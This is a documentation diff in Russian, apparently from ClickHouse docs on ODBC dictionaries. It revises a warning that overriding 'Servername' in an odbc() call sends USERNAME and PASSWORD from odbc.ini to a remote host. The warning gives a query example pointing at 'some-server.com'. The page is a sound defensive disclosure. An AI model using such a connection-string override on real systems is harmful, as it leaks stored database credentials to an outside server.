@@ -124,10 +124,10 @@
 -   `connection_string` - строка соединения.
 -   `invalidate_query` - запрос для проверки статуса словаря. Необязательный параметр. Читайте подробнее в разделе [Обновление словарей](external_dicts_dict_lifetime.md#dicts-external_dicts_dict_lifetime).
 
-### The vulnerability of the ODBC driver
+### Выявленная уязвимость в функционировании ODBC словарей
 
-!!!attention
-    Если при соединении с базой данных через ODBC в параметрах соединения заменить `Servername`, то значения `USERNAME` и `PASSWORD` из `odbc.ini` будут отправлены на удаленный сервер и могут быть скомпроментированы.
+!!! attention
+    При соединении с базой данных через ODBC можно заменить параметр соединения `Servername`. В этом случае, значения `USERNAME` и `PASSWORD` из `odbc.ini` отправляются на удаленный сервер и могут быть скомпроментированы.
 
 **Пример небезопасного использования**
 
@@ -150,7 +150,7 @@ PASSWORD = test
 SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');    
 ```
 
-то ODBC драйвер отправит значения `USERNAME` и `PASSWORD` для `Servername = localhost` на `some-server.com`.
+то ODBC драйвер отправит значения `USERNAME` и `PASSWORD` из `odbc.ini` на `some-server.com`.
 
 ### Пример подключения PostgreSQL
 
